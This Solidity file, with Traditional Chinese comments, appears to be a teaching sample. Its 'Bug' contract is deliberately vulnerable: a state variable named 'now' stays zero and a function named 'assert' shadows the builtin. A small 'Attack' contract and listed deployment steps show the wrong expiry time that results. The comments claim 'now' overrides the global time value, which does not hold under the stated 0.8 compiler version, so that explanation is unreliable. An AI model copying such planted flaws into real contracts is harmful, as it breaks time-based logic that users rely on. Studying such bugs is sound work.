pragma solidity >=0.8.0;

// 此合約示範了因為使用與 Solidity 保留字相同的名稱而導致的漏洞問題。
// 註解重點：
// 1. 變數名稱 now 與內建的全域變數 (原本意圖為使用當前時間 block.timestamp) 衝突，實際上變數 now 未初始化，永遠為 0。
// 2. 函數 assert 與 Solidity 內建的 assert 函數名稱衝突，可能導致誤用或行為異常。
// 3. 函數 get_next_expiration 原本預期以當前時間進行計算，但卻使用了被衝突的變數 now。

contract Bug {
    // 漏洞重點：使用了保留字 now 來命名狀態變數，將全域的 now (或 block.timestamp) 蓋掉
    uint now;  

    // 漏洞重點：函數名稱 assert 蓋掉了內建的 assert 函數
    function assert(bool condition) public pure {
        // 此處不會執行內建斷言行為，可能產生意外的錯誤處理
    }

    // 修改為 public 以便測試與攻擊，漏洞重點：使用了未初始化的 now
    function get_next_expiration(uint earlier_time) public view returns (uint) {
        // 預期應該使用當前區塊時間，但實際上這裡使用的 now 為狀態變數，值固定為 0
        return now + 259200;
    }
}

// 攻擊合約，其目的是利用上述漏洞造成計算錯誤，進而影響系統的時間邏輯
contract Attack {
    Bug public vulnerableContract;

    // 部署 Attack 時需要提供漏洞合約 Bug 的地址
    constructor(address _vulnerableAddress) {
        vulnerableContract = Bug(_vulnerableAddress);
    }

    // 攻擊示範：呼叫 get_next_expiration 取得錯誤的到期時間，因為內部計算使用了未初始化的 now
    function attack() public view returns (uint) {
        // 傳入的 earlier_time 不影響計算結果，此處僅為示範漏洞利用
        return vulnerableContract.get_next_expiration(block.timestamp);
    }
}

/*
部署與攻擊步驟：
1. 部署 Bug 合約。
2. 部署 Attack 合約，並在建構子中傳入 Bug 合約的地址。
3. 呼叫 Attack 合約中的 attack 函數，理論上應該返回 block.timestamp + 259200，但由於漏洞，實際上返回 259200。
*/